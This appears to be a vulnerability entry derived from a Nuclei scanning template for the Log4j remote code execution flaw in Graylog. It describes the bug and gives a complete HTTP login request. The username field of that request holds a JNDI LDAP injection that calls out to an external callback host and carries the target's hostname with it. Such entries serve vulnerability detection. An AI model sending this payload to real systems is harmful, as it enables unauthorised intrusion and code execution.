# Vulnerability: Graylog (Log4j) - Remote Code Execution
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`graylog-log4j-rce.yaml`)

## Description
Graylog is susceptible to remote code execution via the Apache Log4j 2 library prior to 2.15.0 by recording its own log information, specifically with specially crafted values sent as user input. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/system/sessions HTTP/1.1
Host: {{Hostname}}
Accept: application/json
X-Requested-With: XMLHttpRequest
X-Requested-By: XMLHttpRequest
Content-Type: application/json
Origin: {{BaseURL}}
Referer: {{BaseURL}}

{"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}
```

